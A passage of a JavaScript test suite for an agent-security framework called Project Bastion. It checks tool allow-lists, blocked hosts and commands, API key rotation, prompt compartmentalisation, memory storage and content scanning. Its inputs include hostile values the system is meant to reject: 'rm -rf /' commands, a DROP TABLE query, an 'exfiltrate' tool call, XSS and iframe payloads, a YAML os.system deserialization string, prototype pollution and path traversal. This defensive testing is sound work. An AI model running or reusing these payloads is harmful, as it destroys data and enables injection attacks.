      safetyNotes: 'Scoped to app servers only',
      category: 'service_management',
      ...overrides,
    };
  }

  // -------------------------------------------------------------------
  // Test 29: Tool Registry
  // -------------------------------------------------------------------
  console.log('--- Test 29: Tool Registry ---');
  {
    const registry = createToolRegistry();
    check('registry starts empty', registry.size === 0);

    const tool = makeToolDef();
    registry.register(tool);
    check('registry has 1 tool after register', registry.size === 1);
    check('has returns true', registry.has('ssh_command'));
    check('get returns tool', registry.get('ssh_command')?.id === 'ssh_command');

    // Validate allowed invocation
    const r1 = registry.validateInvocation('ssh_command', { host: 'naval-app-01', command: 'ls -la' });
    check('allowed invocation passes', r1.allowed === true);

    // Validate unregistered tool
    const r2 = registry.validateInvocation('unknown_tool');
    check('unregistered tool rejected', r2.allowed === false);
    check('rejection reason mentions unregistered', r2.reason.includes('not registered'));

    // Validate blocked host
    const r3 = registry.validateInvocation('ssh_command', { host: 'evil-server', command: 'ls' });
    check('blocked host rejected', r3.allowed === false);
    check('rejection mentions host', r3.reason.includes('not permitted'));

    // Validate blocked command
    const r4 = registry.validateInvocation('ssh_command', { host: 'naval-app-01', command: 'rm -rf /' });
    check('blocked command rejected', r4.allowed === false);
    check('rejection mentions blocked', r4.reason.includes('blocked'));

    // Anthropic tool format
    const tools = registry.toAnthropicTools();
    check('toAnthropicTools returns 1', tools.length === 1);
    check('anthropic tool has name', tools[0].name === 'ssh_command');
    check('anthropic tool has input_schema', tools[0].input_schema.type === 'object');

    // Unregister
    const removed = registry.unregister('ssh_command');
    check('unregister returns true', removed === true);
    check('registry empty after unregister', registry.size === 0);

    // Pre-populated registry
    const reg2 = createToolRegistry([makeToolDef(), makeToolDef({ id: 'read_file', name: 'Read File', permittedHosts: undefined, blockedCommands: undefined })]);
    check('pre-populated registry has 2 tools', reg2.size === 2);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 30: API Key Manager
  // -------------------------------------------------------------------
  console.log('--- Test 30: API Key Manager ---');
  {
    // No initial key
    const km1 = createApiKeyManager();
    check('no key initially', !km1.hasKey);
    check('getKey returns null', km1.getKey() === null);

    // Set key
    km1.setKey('sk-test-key-123');
    check('hasKey after set', km1.hasKey);
    check('getKey returns set value', km1.getKey() === 'sk-test-key-123');

    // Clear key
    km1.clearKey();
    check('no key after clear', !km1.hasKey);

    // Initial key
    const km2 = createApiKeyManager('sk-initial');
    check('initial key set', km2.getKey() === 'sk-initial');

    // Successful rotation
    const rotateOk = await km2.rotateKey('sk-new-key', async (_key) => true);
    check('rotation success', rotateOk.success);
    check('previous key cleared', rotateOk.previousKeyCleared);
    check('new key installed', km2.getKey() === 'sk-new-key');

    // Failed rotation (test fails)
    const rotateFail = await km2.rotateKey('sk-bad-key', async (_key) => false);
    check('rotation failed', !rotateFail.success);
    check('old key retained', km2.getKey() === 'sk-new-key');
    check('error message present', rotateFail.error?.includes('validation'));

    // Failed rotation (test throws)
    const rotateThrow = await km2.rotateKey('sk-crash', async () => { throw new Error('Network error'); });
    check('rotation error', !rotateThrow.success);
    check('old key still retained', km2.getKey() === 'sk-new-key');
    check('error contains thrown message', rotateThrow.error?.includes('Network error'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 31: Anthropic Adapter — mock API responses
  // -------------------------------------------------------------------
  console.log('--- Test 31: Anthropic Adapter — mock API ---');
  {
    const km = createApiKeyManager('sk-test-key');
    const registry = createToolRegistry([makeToolDef()]);

    // Successful text response
    const mockResp = mockAnthropicResponse(
      [{ type: 'text', text: 'Task completed successfully. Files listed.' }],
      { input_tokens: 150, output_tokens: 75 },
    );
    const mockFetch = createMockFetch(mockResp);
    const adapter = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch);

    const task = makeTask({ action: 'list files', target: '/app/logs' });
    const result = await adapter.executeTask(task);
    check('result is ok', result.ok);
    if (result.ok) {
      check('textContent present', result.response.textContent.includes('Task completed'));
      check('inputTokens correct', result.response.usage.inputTokens === 150);
      check('outputTokens correct', result.response.usage.outputTokens === 75);
      check('cost has estimatedCostUsd', result.response.cost.estimatedCostUsd > 0);
      check('model returned', result.response.model === 'claude-sonnet-4-20250514');
      check('no tool calls', result.response.toolCalls.length === 0);
      check('no rejected tools', result.response.rejectedToolCalls.length === 0);
    }

    // Verify fetch was called with correct headers
    check('fetch called once', mockFetch.calls.length === 1);
    const fetchCall = mockFetch.calls[0];
    check('correct URL', fetchCall.url === 'https://mock.api/v1/messages');
    check('has x-api-key header', fetchCall.init.headers['x-api-key'] === 'sk-test-key');
    check('has anthropic-version header', fetchCall.init.headers['anthropic-version'] === '2023-06-01');

    // No API key configured
    const km2 = createApiKeyManager();
    const adapter2 = createAnthropicAdapter(km2, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
    }, mockFetch);
    const noKeyResult = await adapter2.executeTask(task);
    check('no key → not ok', !noKeyResult.ok);
    if (!noKeyResult.ok) {
      check('error code is PROVIDER_AUTH_FAILED', noKeyResult.errorCode === 'BASTION-6002');
    }

    // HTTP 401 (auth failed)
    const mock401 = createMockFetch({ error: { type: 'authentication_error', message: 'invalid key' } }, 401);
    const adapter401 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mock401);
    const r401 = await adapter401.executeTask(task);
    check('401 → not ok', !r401.ok);
    if (!r401.ok) {
      check('401 → PROVIDER_AUTH_FAILED', r401.errorCode === 'BASTION-6002');
      check('401 → not retryable', !r401.retryable);
    }

    // HTTP 429 (rate limited)
    const mock429 = createMockFetch({ error: { type: 'rate_limit_error', message: 'rate limited' } }, 429);
    const adapter429 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mock429);
    const r429 = await adapter429.executeTask(task);
    check('429 → not ok', !r429.ok);
    if (!r429.ok) {
      check('429 → PROVIDER_RATE_LIMITED', r429.errorCode === 'BASTION-6003');
      check('429 → retryable', r429.retryable);
    }

    // HTTP 500 (server error)
    const mock500 = createMockFetch({ error: { type: 'server_error', message: 'internal' } }, 500);
    const adapter500 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mock500);
    const r500 = await adapter500.executeTask(task);
    check('500 → retryable', !r500.ok && r500.retryable);

    // Test connection
    const testMock = createMockFetch(mockAnthropicResponse([{ type: 'text', text: '' }]));
    const adapterTest = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, testMock);
    const connected = await adapterTest.testConnection();
    check('testConnection returns true', connected);

    // Test connection with explicit key
    const connectedKey = await adapterTest.testConnection('sk-other-key');
    check('testConnection with explicit key', connectedKey);
    check('explicit key used in header', testMock.calls[1].init.headers['x-api-key'] === 'sk-other-key');
  }
  console.log();

  // -------------------------------------------------------------------
  // Test 32: Tool registry enforcement in adapter
  // -------------------------------------------------------------------
  console.log('--- Test 32: Tool registry enforcement ---');
  {
    const km = createApiKeyManager('sk-test');
    const registry = createToolRegistry([makeToolDef()]);

    // Response with tool_use for registered tool
    const toolResp = mockAnthropicResponse([
      { type: 'text', text: 'I will run the command.' },
      {
        type: 'tool_use',
        id: 'toolu_01',
        name: 'ssh_command',
        input: { host: 'naval-app-01', command: 'ls -la /app/logs' },
      },
    ]);
    const mockFetch1 = createMockFetch(toolResp);
    const adapter1 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch1);

    const r1 = await adapter1.executeTask(makeTask({ action: 'list logs', target: '/app/logs' }));
    check('registered tool → ok', r1.ok);
    if (r1.ok) {
      check('1 validated tool call', r1.response.toolCalls.length === 1);
      check('tool call id correct', r1.response.toolCalls[0].toolId === 'ssh_command');
      check('tool call input has host', r1.response.toolCalls[0].input.host === 'naval-app-01');
      check('tool definition attached', r1.response.toolCalls[0].tool.id === 'ssh_command');
      check('0 rejected tool calls', r1.response.rejectedToolCalls.length === 0);
    }

    // Response with tool_use for UNREGISTERED tool
    const unregResp = mockAnthropicResponse([
      { type: 'text', text: 'I will execute the query.' },
      {
        type: 'tool_use',
        id: 'toolu_02',
        name: 'database_query',
        input: { query: 'DROP TABLE users' },
      },
    ]);
    const mockFetch2 = createMockFetch(unregResp);
    const adapter2 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch2);

    const r2 = await adapter2.executeTask(makeTask({ action: 'query database', target: 'users' }));
    check('unregistered tool → still ok (text returned)', r2.ok);
    if (r2.ok) {
      check('0 validated tool calls', r2.response.toolCalls.length === 0);
      check('1 rejected tool call', r2.response.rejectedToolCalls.length === 1);
      check('rejected tool name', r2.response.rejectedToolCalls[0].toolId === 'database_query');
      check('rejection reason', r2.response.rejectedToolCalls[0].reason.includes('not registered'));
    }

    // Tool registered but blocked host
    const blockedHostResp = mockAnthropicResponse([
      {
        type: 'tool_use',
        id: 'toolu_03',
        name: 'ssh_command',
        input: { host: 'production-db', command: 'ls' },
      },
    ]);
    const mockFetch3 = createMockFetch(blockedHostResp);
    const adapter3 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch3);

    const r3 = await adapter3.executeTask(makeTask({ action: 'list', target: 'production-db' }));
    check('blocked host → ok but rejected', r3.ok);
    if (r3.ok) {
      check('0 validated (blocked host)', r3.response.toolCalls.length === 0);
      check('1 rejected (blocked host)', r3.response.rejectedToolCalls.length === 1);
      check('rejected for host', r3.response.rejectedToolCalls[0].reason.includes('not permitted'));
    }

    // Tool registered but blocked command
    const blockedCmdResp = mockAnthropicResponse([
      {
        type: 'tool_use',
        id: 'toolu_04',
        name: 'ssh_command',
        input: { host: 'naval-app-01', command: 'rm -rf /var/data' },
      },
    ]);
    const mockFetch4 = createMockFetch(blockedCmdResp);
    const adapter4 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch4);

    const r4 = await adapter4.executeTask(makeTask({ action: 'cleanup', target: '/var/data' }));
    check('blocked command → ok but rejected', r4.ok);
    if (r4.ok) {
      check('0 validated (blocked cmd)', r4.response.toolCalls.length === 0);
      check('1 rejected (blocked cmd)', r4.response.rejectedToolCalls.length === 1);
      check('rejected for command', r4.response.rejectedToolCalls[0].reason.includes('blocked'));
    }

    // Mixed: one valid tool call, one rejected
    const mixedResp = mockAnthropicResponse([
      { type: 'text', text: 'Running commands.' },
      {
        type: 'tool_use',
        id: 'toolu_05',
        name: 'ssh_command',
        input: { host: 'naval-app-01', command: 'uptime' },
      },
      {
        type: 'tool_use',
        id: 'toolu_06',
        name: 'secret_tool',
        input: { data: 'exfiltrate' },
      },
    ]);
    const mockFetch5 = createMockFetch(mixedResp);
    const adapter5 = createAnthropicAdapter(km, registry, {
      model: 'claude-sonnet-4-20250514',
      maxTokens: 4096,
      apiBaseUrl: 'https://mock.api',
    }, mockFetch5);

    const r5 = await adapter5.executeTask(makeTask({ action: 'status check', target: 'naval-app-01' }));
    check('mixed → ok', r5.ok);
    if (r5.ok) {
      check('1 validated in mixed', r5.response.toolCalls.length === 1);
      check('1 rejected in mixed', r5.response.rejectedToolCalls.length === 1);
      check('valid tool is ssh_command', r5.response.toolCalls[0].toolId === 'ssh_command');
      check('rejected tool is secret_tool', r5.response.rejectedToolCalls[0].toolId === 'secret_tool');
    }
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: ConversationManager
  // -------------------------------------------------------------------
  console.log('--- Test: ConversationManager ---');
  {
    // Basic message management
    const cmPath = `/tmp/bastion-cm-test-${Date.now()}.md`;
    const cm = new ConversationManager({ userContextPath: cmPath });
    check('initial messages empty', cm.messageCount === 0);
    check('initial user context empty', cm.getUserContext() === '');

    cm.addUserMessage('Hello, what can you do?');
    check('1 message after user msg', cm.messageCount === 1);

    cm.addAssistantMessage('I can help with tasks within the Bastion protocol.');
    check('2 messages after assistant msg', cm.messageCount === 2);

    const msgs = cm.getMessages();
    check('first msg is user', msgs[0].role === 'user');
    check('second msg is assistant', msgs[1].role === 'assistant');
    check('user content correct', msgs[0].content === 'Hello, what can you do?');

    // System prompt without user context
    const prompt = cm.getSystemPrompt();
    check('system prompt has soul document', prompt.includes('Project Bastion'));
    check('system prompt identifies Anthropic', prompt.includes('created by Anthropic'));
    check('system prompt has five boundaries', prompt.includes('MALICLAW CLAUSE'));
    check('system prompt has no user context section', !prompt.includes('User Context'));

    // User context
    cm.updateUserContext('Harry works on infrastructure security.');
    check('user context set', cm.getUserContext() === 'Harry works on infrastructure security.');
    const promptWithCtx = cm.getSystemPrompt();
    check('prompt has user context', promptWithCtx.includes('Harry works on infrastructure'));
    check('prompt has role context before user context', promptWithCtx.indexOf('Project Bastion') < promptWithCtx.indexOf('Harry works'));

    // Token estimation
    const tokens = cm.estimateTokenCount();
    check('token estimate positive', tokens > 0);
    check('token estimate reasonable', tokens > 10 && tokens < 10000);

    // Clear preserves user context
    cm.clear();
    check('cleared messages', cm.messageCount === 0);
    check('user context preserved after clear', cm.getUserContext() === 'Harry works on infrastructure security.');

    // Token budget enforcement
    const cm2 = new ConversationManager({ tokenBudget: 200, userContextPath: '/tmp/bastion-test-nonexistent-ctx-99999.md' });
    // Each message ~25 chars → ~6 tokens. System prompt ~200 chars → ~50 tokens. Budget 200.
    for (let i = 0; i < 40; i++) {
      cm2.addUserMessage(`Message number ${i} with some padding text here.`);
      cm2.addAssistantMessage(`Response number ${i} with some padding text here.`);
    }
    check('budget enforced: fewer than 80 messages', cm2.messageCount < 80);
    check('budget enforced: at least 6 preserved', cm2.messageCount >= 6);
    check('token count within budget', cm2.estimateTokenCount() <= 200 || cm2.messageCount === 6);

    // Static role context
    const roleCtx = ConversationManager.getRoleContext();
    check('soul document contains Layer 0 identity', roleCtx.includes('created by Anthropic'));
    check('soul document contains Layer 0 boundaries', roleCtx.includes('MALICLAW CLAUSE'));
    check('soul document contains Layer 1 values', roleCtx.includes('HELPFULNESS'));
    check('soul document contains Layer 2 guidance', roleCtx.includes('CONVERSATION MODE GUIDANCE'));
    check('soul document mentions Project Bastion', roleCtx.includes('Project Bastion'));

    // getCoreContext returns only Layer 0
    const coreCtx = ConversationManager.getCoreContext();
    check('core context has Layer 0', coreCtx.includes('MALICLAW CLAUSE'));
    check('core context omits Layer 1', !coreCtx.includes('HELPFULNESS'));
    check('core context omits Layer 2', !coreCtx.includes('CONVERSATION MODE GUIDANCE'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: Prompt Zone Compartmentalization
  // -------------------------------------------------------------------
  console.log('--- Test: Prompt Zone Compartmentalization ---');
  {
    const cm = new ConversationManager({
      systemBudget: 5000,
      operatorBudget: 2000,
      userBudget: 20000,
      maxContextTokens: 200000,
      maxOutputTokens: 4096,
      userContextPath: '/tmp/bastion-zone-test-user-' + Date.now() + '.md',
      operatorContextPath: '/tmp/bastion-zone-test-operator-' + Date.now() + '.md',
    });

    // assemblePrompt returns prompt + report
    const { prompt, report } = cm.assemblePrompt();

    check('assemblePrompt returns string', typeof prompt === 'string' && prompt.length > 0);
    check('report has 4 zones', report.zones.length === 4);

    const systemZ = report.zones.find(z => z.name === 'system');
    const operatorZ = report.zones.find(z => z.name === 'operator');
    const userZ = report.zones.find(z => z.name === 'user');
    const dynamicZ = report.zones.find(z => z.name === 'dynamic');

    check('system zone exists', !!systemZ);
    check('operator zone exists', !!operatorZ);
    check('user zone exists', !!userZ);
    check('dynamic zone exists', !!dynamicZ);

    // System zone stays within budget
    check('system zone under budget', systemZ.tokenCount <= systemZ.budget, `${systemZ.tokenCount} > ${systemZ.budget}`);
    check('system zone budget is 5000', systemZ.budget === 5000);
    check('system zone has soul layers', systemZ.components.includes('Layer 0: Core'));

    // Operator zone empty without operator-context.md
    check('operator zone budget is 2000', operatorZ.budget === 2000);
    check('operator zone empty (no file)', operatorZ.tokenCount === 0);
    check('operator zone not truncated', !operatorZ.truncated);

    // User zone empty without user context or memories
    check('user zone budget is 20000', userZ.budget === 20000);
    check('user zone empty (no context)', userZ.tokenCount === 0);

    // Dynamic zone gets remaining budget
    check('dynamic zone budget > 0', dynamicZ.budget > 0);

    // Report totals
    check('totalTokens matches sum', report.totalTokens === systemZ.tokenCount + operatorZ.tokenCount + userZ.tokenCount + dynamicZ.tokenCount);
    check('maxContextTokens is 200000', report.maxContextTokens === 200000);
    check('available > 0', report.available > 0);
    check('utilization between 0-100', report.utilizationPercent >= 0 && report.utilizationPercent <= 100);

    // Backward compatibility: getSystemPrompt returns same content
    const legacyPrompt = cm.getSystemPrompt();
    check('getSystemPrompt returns same as assemblePrompt', legacyPrompt === prompt);

    // Budget report method
    const reportOnly = cm.getPromptBudgetReport();
    check('getPromptBudgetReport has 4 zones', reportOnly.zones.length === 4);
    check('budget report totalTokens matches', reportOnly.totalTokens === report.totalTokens);

    // Test budget enforcement: system zone with small budget
    const cmSmall = new ConversationManager({
      systemBudget: 100, // tiny — will truncate soul document
      operatorBudget: 100,
      userBudget: 100,
      maxContextTokens: 200000,
      maxOutputTokens: 4096,
      userContextPath: '/tmp/bastion-zone-test-user2-' + Date.now() + '.md',
      operatorContextPath: '/tmp/bastion-zone-test-op2-' + Date.now() + '.md',
    });

    const smallReport = cmSmall.getPromptBudgetReport();
    const smallSystem = smallReport.zones.find(z => z.name === 'system');
    check('system zone truncated when budget tiny', smallSystem.truncated);
    check('system zone token count <= budget', smallSystem.tokenCount <= smallSystem.budget);

    // Zone isolation: user context doesn't bleed into system zone
    cmSmall.updateUserContext('This is user data that must not appear in system zone.');
    const isolationReport = cmSmall.getPromptBudgetReport();
    const isoSystem = isolationReport.zones.find(z => z.name === 'system');
    const isoUser = isolationReport.zones.find(z => z.name === 'user');
    check('system zone does not contain user data', !isoSystem.content.includes('This is user data'));
    check('user zone contains user data', isoUser.content.includes('This is user data'));
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: MemoryStore — CRUD and prompt injection
  // -------------------------------------------------------------------
  console.log('--- Test: MemoryStore ---');
  {
    const store = new MemoryStore({ path: ':memory:', maxPromptMemoriesPerScope: 5 });
    check('initial count 0', store.count === 0);

    // Add memories
    const id1 = store.addMemory('Harry prefers concise answers', 'preference', 'msg-001');
    check('addMemory returns id', typeof id1 === 'string' && id1.length > 0);
    check('count after add', store.count === 1);

    const id2 = store.addMemory('Works on Naval Fleet infrastructure', 'fact', 'msg-002');
    const id3 = store.addMemory('Uses nftables for firewall', 'workflow', 'msg-003');
    check('count 3', store.count === 3);

    // Get all
    const all = store.getMemories();
    check('getMemories returns 3', all.length === 3);
    check('memories have content', all[0].content.length > 0);
    check('memories have category', ['preference', 'fact', 'workflow', 'project'].includes(all[0].category));
    check('memories have timestamps', all[0].createdAt.length > 0);

    // Get by category
    const prefs = store.getMemoriesByCategory('preference');
    check('1 preference', prefs.length === 1);
    check('preference content', prefs[0].content === 'Harry prefers concise answers');

    const facts = store.getMemoriesByCategory('fact');
    check('1 fact', facts.length === 1);

    // Update
    const updated = store.updateMemory(id1, 'Harry prefers concise answers with command examples');
    check('update returns true', updated);
    const afterUpdate = store.getMemories();
    const found = afterUpdate.find(m => m.id === id1);
    check('updated content', found?.content === 'Harry prefers concise answers with command examples');

    // Search
    const results = store.searchMemories('Naval');
    check('search finds 1', results.length === 1);
    check('search result correct', results[0].content.includes('Naval Fleet'));

    const noResults = store.searchMemories('nonexistent');
    check('search finds 0 for nonexistent', noResults.length === 0);

    // Delete
    const deleted = store.deleteMemory(id3);
    check('delete returns true', deleted);
    check('count after delete', store.count === 2);

    const deleteMissing = store.deleteMemory('nonexistent-id');
    check('delete missing returns false', !deleteMissing);

    // Prompt injection
    const promptText = store.getPromptMemories();
    check('prompt has memories', promptText.includes('Global Memories'));
    check('prompt has preference', promptText.includes('[preference]'));
    check('prompt has content', promptText.includes('concise answers'));

    // Max prompt memories limit
    for (let i = 0; i < 10; i++) {
      store.addMemory(`Memory ${i} for limit test`, 'fact', `msg-limit-${i}`);
    }
    check('total count > 5', store.count > 5);
    const limitedPrompt = store.getPromptMemories();
    // maxPromptMemories is 5 — should only have 5 in the prompt
    const lineCount = limitedPrompt.split('\n').filter(l => l.startsWith('- [')).length;
    check('prompt limited to 5 memories', lineCount === 5);

    // ConversationManager integration
    const cm = new ConversationManager({
      userContextPath: `/tmp/bastion-cm-memtest-${Date.now()}.md`,
      memoryStore: store,
    });
    const sysPrompt = cm.getSystemPrompt();
    check('system prompt has memories', sysPrompt.includes('Global Memories'));
    check('system prompt has role context', sysPrompt.includes('Project Bastion'));
    check('memories after role context', sysPrompt.indexOf('Project Bastion') < sysPrompt.indexOf('Global Memories'));

    store.close();
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: Path validation
  // -------------------------------------------------------------------
  console.log('--- Test: Path validation ---');
  {
    check('valid .md path', validatePath('world-rules.md').valid);
    check('valid nested path', validatePath('factions/iron-league.md').valid);
    check('valid .json', validatePath('config/settings.json').valid);
    check('valid .yaml', validatePath('data/schema.yaml').valid);
    check('valid .yml', validatePath('data/schema.yml').valid);
    check('valid .txt', validatePath('notes/readme.txt').valid);

    check('reject absolute path', !validatePath('/etc/passwd').valid);
    check('reject path traversal', !validatePath('../escape.md').valid);
    check('reject double slash', !validatePath('foo//bar.md').valid);
    check('reject hidden file', !validatePath('.secret.md').valid);
    check('reject hidden dir', !validatePath('.git/config.txt').valid);
    check('reject long path', !validatePath('a'.repeat(256) + '.md').valid);
    check('reject .js extension', !validatePath('code.js').valid);
    check('reject .ts extension', !validatePath('code.ts').valid);
    check('reject empty path', !validatePath('').valid);
    check('reject backslash', !validatePath('..\\escape.md').valid);

    check('sanitises whitespace', validatePath('  hello.md  ').sanitised === 'hello.md');
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: ProjectStore — CRUD and prompt context
  // -------------------------------------------------------------------
  console.log('--- Test: ProjectStore ---');
  {
    const tmpDir = '/tmp/bastion-project-test-' + Date.now();
    const store = new ProjectStore({ rootDir: tmpDir, maxFileSize: 1024, maxTotalSize: 4096 });

    check('initial count 0', store.fileCount === 0);

    // Save file
    const r1 = store.saveFile('world-rules.md', '# World Rules\nNo PvP.', 'text/markdown');
    check('save ok', r1.ok);
    check('count after save', store.fileCount === 1);

    // Save nested file
    const r2 = store.saveFile('factions/iron-league.md', '# Iron League', 'text/markdown');
    check('nested save ok', r2.ok);
    check('count 2', store.fileCount === 2);

    // Read file
    const content = store.readFile('world-rules.md');
    check('read content', content === '# World Rules\nNo PvP.');

    // List files
    const files = store.listFiles();
    check('list returns 2', files.length === 2);
    check('list has paths', files.some(f => f.path === 'world-rules.md'));
    check('list has nested', files.some(f => f.path === 'factions/iron-league.md'));

    // Reject bad extension
    const r3 = store.saveFile('code.js', 'console.log("hi")', 'text/javascript');
    check('reject .js', !r3.ok);

    // Reject oversized file
    const bigContent = 'x'.repeat(2000);
    const r4 = store.saveFile('big.md', bigContent, 'text/markdown');
    check('reject oversized', !r4.ok);

    // Config
    store.setConfig(['world-rules.md'], ['factions/iron-league.md']);
    const cfg = store.getConfig();
    check('config alwaysLoaded', cfg.alwaysLoaded.length === 1);
    check('config available', cfg.available.length === 1);

    // Prompt context
    const prompt = store.getPromptContext();
    check('prompt has content', prompt.includes('Project Context'));
    check('prompt has file', prompt.includes('=== world-rules.md ==='));
    check('prompt has text', prompt.includes('No PvP'));

    // Delete
    const deleted = store.deleteFile('world-rules.md');
    check('delete ok', deleted);
    check('count after delete', store.fileCount === 1);
    check('removed from config', store.getConfig().alwaysLoaded.length === 0);

    // Total size
    check('total size > 0', store.getTotalSize() > 0);

    // Content scanning — reject embedded scripts
    const script1 = store.saveFile('evil1.md', '# Hello\n<script>alert("xss")</script>', 'text/markdown');
    check('reject <script> tag', !script1.ok && script1.error.includes('script'));

    const script2 = store.saveFile('evil2.md', '[click](javascript:alert(1))', 'text/markdown');
    check('reject javascript: URI', !script2.ok && script2.error.includes('JavaScript'));

    const script3 = store.saveFile('evil3.md', '<img src=x onerror=alert(1)>', 'text/markdown');
    check('reject event handler', !script3.ok && script3.error.includes('event handler'));

    const script4 = store.saveFile('evil4.md', '<iframe src="http://evil.com"></iframe>', 'text/markdown');
    check('reject iframe', !script4.ok && script4.error.includes('iframe'));

    const yaml1 = store.saveFile('evil.yaml', '!!python/object:os.system\nargs: ["rm -rf /"]', 'text/yaml');
    check('reject YAML deserialization', !yaml1.ok && yaml1.error.includes('YAML'));

    const json1 = store.saveFile('evil.json', '{"__proto__": {"admin": true}}', 'application/json');
    check('reject __proto__ pollution', !json1.ok && json1.error.includes('proto'));

    // Safe content should still pass
    const safe1 = store.saveFile('safe.md', '# Hello World\nThis is safe content.', 'text/markdown');
    check('allow safe markdown', safe1.ok);

    const safe2 = store.saveFile('safe.json', '{"name": "test", "value": 42}', 'application/json');
    check('allow safe JSON', safe2.ok);

    // scanContent direct tests
    check('scanContent null for safe', scanContent('# Hello World') === null);
    check('scanContent detects script', scanContent('<script>bad</script>') !== null);
    check('scanContent detects onload', scanContent('<body onload=evil()>') !== null);
    check('scanContent detects data URI', scanContent('data:text/html,<h1>hi</h1>') !== null);
    check('scanContent detects embed', scanContent('<embed src="evil.swf">') !== null);

    // Cleanup
    const { rmSync: rm } = await import('node:fs');
    rm(tmpDir, { recursive: true, force: true });
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: ToolRegistryManager
  // -------------------------------------------------------------------
  console.log('--- Test: ToolRegistryManager ---');
  {
    const trm = new ToolRegistryManager();
    check('initial empty', trm.toolCount === 0);
    check('initial no providers', trm.providerCount === 0);

    // Load from sync payload
    trm.loadFromSync({
      providers: [
        {
          id: 'obsidian', name: 'Obsidian', endpoint: 'http://localhost:3000', authType: 'api_key',
          tools: [
            { name: 'read_note', description: 'Read a note', category: 'read', readOnly: true, dangerous: false, modes: ['conversation', 'task'] },
            { name: 'create_note', description: 'Create a note', category: 'write', readOnly: false, dangerous: false, modes: ['task'] },
            { name: 'delete_note', description: 'Delete a note', category: 'destructive', readOnly: false, dangerous: true, modes: ['task'] },
          ],
        },
      ],
      registryHash: 'testhash123',
    });

    check('loaded 3 tools', trm.toolCount === 3);
    check('loaded 1 provider', trm.providerCount === 1);
    check('registry hash', trm.registryHash === 'testhash123');

    // Get tool
    const readNote = trm.getTool('obsidian:read_note');
    check('getTool finds read_note', readNote !== undefined);
    check('tool fullId', readNote?.fullId === 'obsidian:read_note');
    check('tool readOnly', readNote?.readOnly === true);
    check('tool not dangerous', readNote?.dangerous === false);

    const deleteNote = trm.getTool('obsidian:delete_note');
    check('delete_note is dangerous', deleteNote?.dangerous === true);

    // Mode filtering — conversation mode strips dangerous tools
    const convTools = trm.getToolsForMode('conversation');
    check('conversation: 1 tool (read_note only)', convTools.length === 1);
    check('conversation: no dangerous', convTools.every(t => !t.dangerous));

    // Mode filtering — task mode includes all
    const taskTools = trm.getToolsForMode('task');
    check('task: 3 tools', taskTools.length === 3);
    check('task: includes dangerous', taskTools.some(t => t.dangerous));

    // Prompt section
    const convPrompt = trm.getToolPromptSection('conversation');
    check('conv prompt has tools', convPrompt.includes('Available Tools'));
    check('conv prompt has read_note', convPrompt.includes('obsidian:read_note'));
    check('conv prompt no delete_note', !convPrompt.includes('delete_note'));

    const taskPrompt = trm.getToolPromptSection('task');
    check('task prompt has delete_note', taskPrompt.includes('delete_note'));
    check('task prompt marks dangerous', taskPrompt.includes('DANGEROUS'));

    // Session trust — read-only auto-approve
    check('no auto-approve without trust', !trm.shouldAutoApprove('obsidian:read_note'));

    trm.grantTrust('obsidian:read_note', 5, 'session');
    check('auto-approve read-only trust 5 session', trm.shouldAutoApprove('obsidian:read_note'));

    trm.grantTrust('obsidian:read_note', 3, 'session');
    check('no auto-approve trust 3', !trm.shouldAutoApprove('obsidian:read_note'));

    trm.grantTrust('obsidian:read_note', 5, 'this_call');
    check('no auto-approve this_call scope', !trm.shouldAutoApprove('obsidian:read_note'));

    // Write tools never auto-approve
    trm.grantTrust('obsidian:create_note', 10, 'session');
    check('write tool never auto-approve', !trm.shouldAutoApprove('obsidian:create_note'));

    // Dangerous tools never auto-approve
    trm.grantTrust('obsidian:delete_note', 10, 'session');
    check('dangerous tool never auto-approve', !trm.shouldAutoApprove('obsidian:delete_note'));

    // Revoke
    check('revoke existing', trm.revokeTrust('obsidian:read_note'));
    check('after revoke no auto-approve', !trm.shouldAutoApprove('obsidian:read_note'));

    // Session trusts
    check('session trusts count', trm.getSessionTrusts().length === 2); // create_note + delete_note still granted
    trm.clearSessionTrusts();
    check('cleared all trusts', trm.getSessionTrusts().length === 0);

    // Provider access
    const provider = trm.getProvider('obsidian');
    check('getProvider', provider !== undefined);
    check('provider name', provider?.name === 'Obsidian');
    check('getAllProviders', trm.getAllProviders().length === 1);

    // Compute hash
    const hash = trm.computeHash();
    check('computeHash non-empty', hash.length > 0);
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: ChallengeManager
  // -------------------------------------------------------------------
  console.log('--- Test: ChallengeManager ---');
  {
    const cfgPath = `/tmp/bastion-challenge-test-${Date.now()}.json`;
    const cm = new ChallengeManager(cfgPath);

    // Basic properties
    check('has timezone', cm.timezone.length > 0);
    check('enabled by default', cm.enabled);

    // getStatus
    const status = cm.getStatus();
    check('status has active', typeof status.active === 'boolean');
    check('status has timezone', status.timezone.length > 0);
